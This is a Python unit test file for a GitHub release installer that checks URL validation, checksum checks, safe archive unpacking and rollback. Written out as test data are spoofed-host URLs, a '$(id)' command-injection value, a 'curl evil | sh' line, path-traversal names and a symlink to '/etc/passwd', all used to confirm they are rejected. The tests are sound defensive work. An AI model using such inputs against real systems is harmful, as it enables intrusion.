"""Release fixtures only: no network, application launch or real installation."""
import contextlib
import hashlib
import importlib.util
import io
import json
import os
from pathlib import Path
import struct
import tarfile
import tempfile
import unittest
from unittest.mock import patch
import zipfile

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location('github_release', ROOT / 'scripts/github-release.py')
g = importlib.util.module_from_spec(spec)
spec.loader.exec_module(g)
REPO = 'owner/demo'
URL = 'https://github.com/' + REPO


def binary(arch='x86_64'):
    data = bytearray(64)
    data[:6] = b'\x7fELF\x02\x01'
    data[16:20] = struct.pack('<HH', 2, 62 if arch == 'x86_64' else 183)
    return bytes(data)


def asset(name='demo-linux-x86_64.AppImage', data=None):
    data = binary() if data is None else data
    return dict(id=5, name=name, browser_download_url=URL + '/releases/download/v1/' + name,
                size=len(data), digest='sha256:' + hashlib.sha256(data).hexdigest())


def metadata(assets=None, **kwargs):
    return dict(id=11, tag_name='v1', draft=False, prerelease=False,
                assets=[asset()] if assets is None else assets, **kwargs)


def fixtures(release):
    def api(path):
        if path == 'repos/' + REPO:
            return dict(full_name=REPO, name='Demo')
        if path == 'repos/' + REPO + '/releases/latest':
            return release
        raise AssertionError('Unexpected API request: ' + path)
    return api


class ReleaseTests(unittest.TestCase):
    def test_url_validation(self):
        for value in [URL, URL + '/', URL + '.git', '  ' + URL + '  ']:
            self.assertEqual(g.repo_url(value), REPO)
        self.assertEqual(g.repo_url('https://github.com/owner/.dotfiles'), 'owner/.dotfiles')
        for value in ['http://github.com/owner/demo', 'https://github.com.evil/owner/demo', 'https://github.com@evil/owner/demo', 'https://user:password@github.com/owner/demo', URL + '/releases', 'https://github.com/own\ner/demo', 'https://github.com/own\ter/demo', URL + '?x=y', URL + '#readme', URL + '/../../etc', 'https://github.com/../demo', 'https://github.com/owner/%64emo', 'https://github.com/owner/$(id)', None, 'owner/demo']:
            with self.subTest(value=value), self.assertRaises(ValueError):
                g.repo_url(value)

    def test_release_selection_uses_latest_stable_and_all_matching_assets(self):
        release = metadata([asset(), asset('demo-linux-aarch64.AppImage'), asset('demo-windows-x64.zip'), asset('demo-linux-x86_64.tar.gz'), asset('demo-darwin-x86_64.tar.gz'), asset('Source.tar.gz')])
        with patch.object(g, 'api', side_effect=fixtures(release)) as api:
            result = g.inspect(URL, 'amd64')
        self.assertEqual([a['method'] for a in result['candidates']], ['AppImage', 'Linux binary archive'])
        self.assertEqual(result['arch'], 'x86_64')
        self.assertEqual(result['version'], 'v1')
        self.assertEqual(api.call_args_list[-1].args, ('repos/owner/demo/releases/latest',))
        for key in ['draft', 'prerelease']:
            release = metadata(); release[key] = True
            with patch.object(g, 'api', side_effect=fixtures(release)), self.assertRaisesRegex(RuntimeError, 'stable'):
                g.inspect(URL, 'x86_64')

    def test_architectures_and_unknown_assets_are_not_guessed(self):
        self.assertEqual(g.architecture('arm64'), 'aarch64')
        with self.assertRaises(ValueError): g.architecture('i686')
        for name in ['demo.AppImage', 'demo-linux-armv7.tar.gz', 'demo-darwin-arm64.zip', 'demo-linux-arm64-x86_64.zip', 'demo-linux-x86_64.deb', 'demo-linux-x86_64.run', 'demo-linux-x86_64.sh']:
            self.assertIsNone(g.asset_method(name, 'x86_64'))
        self.assertEqual(g.asset_method('demo-linux-arm64.bin', 'aarch64'), 'Linux binary')
        with patch.object(g, 'api', side_effect=fixtures(metadata([]))):
            self.assertIn('not automatically installed', g.inspect(URL, 'x86_64')['explanation'])

    def test_no_release_explains_source_build_limit(self):
        def api(path):
            if path.endswith('/latest'): raise RuntimeError('Repository or stable release not found.')
            return dict(full_name=REPO, name='Demo')
        with patch.object(g, 'api', side_effect=api), self.assertRaisesRegex(RuntimeError, 'source code is not yet supported'):
            g.inspect(URL)

    def test_release_downloads_and_redirects_require_trusted_https_hosts(self):
        for url in ['http://github.com/file', 'file:///tmp/file', 'https://evil.test/file', 'https://github.com@evil.test/file', 'https://github.com:444/file']:
            with self.subTest(url=url), self.assertRaises(ValueError): g.secure_url(url)
        self.assertEqual(g.secure_url('https://release-assets.githubusercontent.com/file'), 'https://release-assets.githubusercontent.com/file')
        value = asset(); value['browser_download_url'] = 'https://github.com/other/repo/releases/download/v1/file'
        with self.assertRaisesRegex(ValueError, 'belong'): g.asset_record(value, REPO)
        request = g.urllib.request.Request(URL)
        with self.assertRaises(ValueError): g.Redirects().redirect_request(request, None, 302, '', {}, 'http://evil.test/file')

    def test_network_errors_explain_rate_limits_and_missing_releases(self):
        for code, message in [(403, 'rate-limited'), (429, 'rate-limited'), (404, 'not found'), (500, 'HTTP 500')]:
            error = g.urllib.error.HTTPError('https://api.github.com/repos/owner/demo', code, 'fixture', {}, None)
            with self.subTest(code=code), patch.object(g.urllib.request, 'build_opener') as opener:
                opener.return_value.open.side_effect = error
                with self.assertRaisesRegex(RuntimeError, message): g.open_url('https://api.github.com/repos/owner/demo')
        with patch.object(g.urllib.request, 'build_opener') as opener:
            opener.return_value.open.side_effect = g.urllib.error.URLError('fixture offline')
            with self.assertRaisesRegex(RuntimeError, 'Check your network'): g.open_url(URL)

    def test_checksum_formats_and_sidecars(self):
        digest = hashlib.sha256(binary()).hexdigest()
        for text in [digest + '  demo.AppImage', digest + ' *demo.AppImage', digest + '  ./demo.AppImage', 'SHA256 (demo.AppImage) = ' + digest, digest]:
            self.assertEqual(g.checksum_text(text, 'demo.AppImage'), [digest])
        self.assertEqual(g.checksum_text(digest + '  other', 'demo.AppImage'), [])
        release = metadata([asset(), asset('SHA256SUMS'), asset('demo-linux-x86_64.AppImage.sha256')])
        with patch.object(g, 'api', side_effect=fixtures(release)):
            self.assertEqual(len(g.inspect(URL, 'x86_64')['candidates'][0]['checksums']), 2)

    def test_checksum_mismatch_and_unusable_published_file_stop_install(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory); path = root / 'download'; path.write_bytes(binary())
            with patch.object(g, 'emit'):
                with self.assertRaisesRegex(RuntimeError, 'Checksum mismatch'):
                    g.verify(dict(digest='sha256:' + '0' * 64), path, root)
                with self.assertRaisesRegex(RuntimeError, 'malformed'):
                    g.verify(dict(digest='md5:123'), path, root)
                published = dict(name='SHA256SUMS', url=URL + '/releases/download/v1/SHA256SUMS')
                with patch.object(g, 'download', side_effect=lambda a, p, limit: p.write_text('unsupported checksum format')):
                    with self.assertRaisesRegex(RuntimeError, 'no supported checksum'):
                        g.verify(dict(name='demo', checksums=[published]), path, root)

    def test_published_checksum_file_verified_without_api_digest(self):
        data = binary(); digest = hashlib.sha512(data).hexdigest()
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory); path = root / 'download'; path.write_bytes(data)
            item = dict(name='demo', checksums=[dict(name='SHA512SUMS')])
            with patch.object(g, 'download', side_effect=lambda a, p, limit: p.write_text(digest + '  demo\n')), patch.object(g, 'emit'):
                self.assertEqual(g.verify(item, path, root), hashlib.sha256(data).hexdigest())

    def test_size_limit_and_truncated_download(self):
        with tempfile.TemporaryDirectory() as directory, patch.object(g, 'open_url', return_value=io.BytesIO(b'abc')), patch.object(g, 'emit'):
            with self.assertRaisesRegex(RuntimeError, 'size differs'):
                g.download(dict(name='demo', url=URL, size=6), Path(directory) / 'file')
        with tempfile.TemporaryDirectory() as directory, patch.object(g, 'open_url', return_value=io.BytesIO(b'abc')), patch.object(g, 'emit'):
            with self.assertRaisesRegex(RuntimeError, 'exceeds'):
                g.download(dict(name='demo', url=URL), Path(directory) / 'file', limit=2)

    @contextlib.contextmanager
    def environment(self, data=None, name='demo-linux-x86_64.AppImage'):
        data = binary() if data is None else data
        with tempfile.TemporaryDirectory() as directory, patch.object(g, 'api', side_effect=fixtures(metadata([asset(name, data)]))), patch.object(g, 'architecture', return_value='x86_64'), patch.object(g, 'open_url', side_effect=lambda url: io.BytesIO(data)), patch.object(g.os, 'geteuid', return_value=1000), patch.object(g, 'emit'):
            yield Path(directory), g.inspect(URL)['candidates'][0]

    def test_appimage_install_list_remove_roundtrip(self):
        with self.environment() as (home, item):
            record = g.install(item, home)
            root, bin_dir, desktop_dir = g.locations(home)
            self.assertEqual(g.installed(home), [record])
            launcher = bin_dir / 'archeasy-owner-demo'
            self.assertTrue(launcher.is_symlink())
            self.assertEqual(launcher.read_bytes(), binary())
            self.assertEqual(launcher.stat().st_mode & 0o777, 0o755)
            self.assertIn('Terminal=false', (desktop_dir / (record['id'] + '.desktop')).read_text())
            with self.assertRaisesRegex(RuntimeError, 'already installed'): g.install(item, home)
            g.remove(record['id'], home)
            self.assertFalse(os.path.lexists(launcher))
            self.assertEqual(g.installed(home), [])
            self.assertEqual(list(desktop_dir.iterdir()), [])
            self.assertFalse(any(root.glob('.install-*')))

    def test_standalone_binary_has_launcher_without_menu(self):
        with self.environment(name='demo-linux-x86_64') as (home, item):
            record = g.install(item, home)
            self.assertIsNone(record['desktop_sha256'])
            self.assertEqual(list(g.locations(home)[2].iterdir()), [])
            g.remove(record['id'], home)

    def archive(self, members, zip_format=False):
        output = io.BytesIO()
        if zip_format:
            with zipfile.ZipFile(output, 'w') as archive:
                for name, data, mode in members:
                    entry = zipfile.ZipInfo(name); entry.external_attr = mode << 16
                    archive.writestr(entry, data)
        else:
            with tarfile.open(fileobj=output, mode='w:gz') as archive:
                for name, data, mode in members:
                    entry = tarfile.TarInfo(name); entry.size = len(data); entry.mode = mode
                    archive.addfile(entry, io.BytesIO(data))
        return output.getvalue()

    def test_tar_and_zip_binary_install_and_remove(self):
        for zip_format in [False, True]:
            data = self.archive([('bundle/demo', binary(), 0o100755), ('bundle/README', b'curl evil | sh', 0o100644)], zip_format)
            with self.environment(data, 'demo-linux-x86_64.' + ('zip' if zip_format else 'tar.gz')) as (home, item):
                record = g.install(item, home)
                self.assertEqual(record['executable'], 'payload/bundle/demo')
                self.assertFalse(record['desktop_sha256'])
                g.remove(record['id'], home)

    def test_wrong_arch_and_scripts_never_install(self):
        for data in [binary('aarch64'), b'#!/bin/sh\necho installer']:
            with self.environment(data) as (home, item), self.assertRaisesRegex(RuntimeError, 'ELF binary'):
                g.install(item, home)
            # Temporary fixture teardown confirms no execution was needed.

    def test_failed_checksum_rolls_back_staging(self):
        with self.environment() as (home, item):
            with patch.object(g, 'open_url', return_value=io.BytesIO(b'x' * len(binary()))), self.assertRaisesRegex(RuntimeError, 'Checksum mismatch'):
                g.install(item, home)
            self.assertEqual(g.installed(home), [])
            self.assertEqual(list(g.locations(home)[1].iterdir()), [])
            self.assertFalse(any(g.locations(home)[0].glob('.install-*')))

    def test_interrupted_download_leaves_no_installed_files(self):
        class BrokenResponse(io.BytesIO):
            def read(self, size=-1):
                raise TimeoutError('fixture connection interrupted')
        with self.environment() as (home, item):
            with patch.object(g, 'open_url', return_value=BrokenResponse()), self.assertRaises(TimeoutError):
                g.install(item, home)
            self.assertEqual(g.installed(home), [])
            self.assertEqual(list(g.locations(home)[1].iterdir()), [])
            self.assertFalse(any(g.locations(home)[0].glob('.install-*')))

    def test_arm64_appimage_installation(self):
        data = binary('aarch64'); release = metadata([asset('demo-linux-arm64.AppImage', data)])
        with tempfile.TemporaryDirectory() as directory, patch.object(g, 'api', side_effect=fixtures(release)), patch.object(g, 'architecture', return_value='aarch64'), patch.object(g, 'open_url', side_effect=lambda url: io.BytesIO(data)), patch.object(g.os, 'geteuid', return_value=1000), patch.object(g, 'emit'):
            home = Path(directory); selected = g.inspect(URL)['candidates'][0]
            self.assertEqual(g.install(selected, home)['arch'], 'aarch64')

    def test_changed_release_refused(self):
        with self.environment() as (home, item):
            item['version'] = 'v0'
            with self.assertRaisesRegex(RuntimeError, 'changed since inspection'): g.install(item, home)
            self.assertFalse(g.locations(home)[0].exists())

    def test_archive_traversal_links_and_limits(self):
        for zip_format in [False, True]:
            for name in ['../../escape', '/absolute', 'dir/../escape', 'bad\\path']:
                data = self.archive([(name, b'bad', 0o100644)], zip_format)
                with tempfile.TemporaryDirectory() as directory:
                    root = Path(directory); archive = root / 'file'; archive.write_bytes(data); payload = root / 'payload'; payload.mkdir()
                    with self.assertRaisesRegex(RuntimeError, 'Unsafe path'): g.unpack(archive, payload)
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory); archive = root / 'file'
            with tarfile.open(archive, 'w') as output:
                entry = tarfile.TarInfo('link'); entry.type = tarfile.SYMTYPE; entry.linkname = '/etc/passwd'; output.addfile(entry)
            with self.assertRaisesRegex(RuntimeError, 'links'): g.unpack(archive, root / 'payload')
        data = self.archive([('demo', binary(), 0o100755)])
        with tempfile.TemporaryDirectory() as directory, patch.object(g, 'MAX_EXPANDED', 1):
            root = Path(directory); archive = root / 'file'; archive.write_bytes(data)
            with self.assertRaisesRegex(RuntimeError, 'limits'): g.unpack(archive, root / 'payload')

    def test_ambiguous_archive_needs_manual_install(self):
        data = self.archive([('one', binary(), 0o100755), ('two', binary(), 0o100755)])
        with self.environment(data, 'demo-linux-x86_64.tar.gz') as (home, item):
            with self.assertRaisesRegex(RuntimeError, 'one application executable'): g.install(item, home)
            self.assertEqual(g.installed(home), [])

    def test_external_launcher_and_modified_menu_preserved(self):
        with self.environment() as (home, item):
            root, bin_dir, desktop_dir = g.locations(home)
            bin_dir.mkdir(parents=True); launcher = bin_dir / 'archeasy-owner-demo'; launcher.write_text('external')
            with self.assertRaisesRegex(RuntimeError, 'already exists'): g.install(item, home)
            self.assertEqual(launcher.read_text(), 'external')
            launcher.unlink()
            record = g.install(item, home)
            desktop = desktop_dir / (record['id'] + '.desktop'); desktop.write_text('user customized')
            with self.assertRaisesRegex(RuntimeError, 'changed'): g.remove(record['id'], home)
            self.assertEqual(desktop.read_text(), 'user customized')
            self.assertTrue(launcher.exists())

    def test_removal_preserves_replaced_launcher_and_can_retry_missing_files(self):
        with self.environment() as (home, item):
            record = g.install(item, home)
            launcher = g.locations(home)[1] / record['launcher']
            launcher.unlink(); launcher.write_text('user replacement')
            with self.assertRaisesRegex(RuntimeError, 'replaced'): g.remove(record['id'], home)
            self.assertEqual(launcher.read_text(), 'user replacement')
            launcher.unlink()
            (g.locations(home)[2] / (record['id'] + '.desktop')).unlink()
            g.remove(record['id'], home)
            self.assertEqual(g.installed(home), [])

    def test_install_rollback_on_menu_write_failure(self):
        with self.environment() as (home, item):
            original = Path.open
            def fail(path, *args, **kwargs):
                if path.suffix == '.desktop': raise PermissionError('fixture menu write failure')
                return original(path, *args, **kwargs)
            with patch.object(Path, 'open', fail), self.assertRaises(PermissionError): g.install(item, home)
            self.assertEqual(g.installed(home), [])
            self.assertEqual(list(g.locations(home)[1].iterdir()), [])

    def test_removal_rejects_untracked_id_and_tampered_registry_paths(self):
        with self.environment() as (home, item):
            for identity in ['../../etc', 'not-tracked', 'github-' + 'f' * 24]:
                with self.assertRaises((ValueError, RuntimeError)): g.remove(identity, home)
            record = g.install(item, home)
            record['executable'] = '../../external'
            (g.locations(home)[0] / record['id'] / '.archeasy.json').write_text(json.dumps(record))
            with self.assertRaisesRegex(RuntimeError, 'Invalid tracked executable'): g.remove(record['id'], home)

    def test_no_root_installation_or_removal(self):
        with patch.object(g.os, 'geteuid', return_value=0):
            with self.assertRaisesRegex(RuntimeError, 'Root installation'): g.install({})
            with self.assertRaisesRegex(RuntimeError, 'normal desktop user'): g.remove('anything')

    def test_symlink_app_directory_and_lock_contention_refused(self):
        with tempfile.TemporaryDirectory() as directory:
            home = Path(directory); root = g.locations(home)[0]; root.parent.mkdir(parents=True)
            other = home / 'outside'; other.mkdir(); root.symlink_to(other)
            with self.assertRaisesRegex(RuntimeError, 'symlink'):
                with g.lock(root): self.fail('symlink accepted')
            root.unlink()
            with g.lock(root):
                with self.assertRaisesRegex(RuntimeError, 'Another GitHub'):
                    with g.lock(root): self.fail('concurrent operation accepted')

    def test_desktop_text_escapes_special_paths_and_title(self):
        text = g.desktop_text('Demo\nInjected=true', Path('/home/name with % and $/app'), False)
        self.assertIn('Name=DemoInjected=true\n', text)
        self.assertIn('%%', text)
        self.assertIn('Exec="', text)
        self.assertNotIn('\nInjected=', text)


if __name__ == '__main__':
    unittest.main()
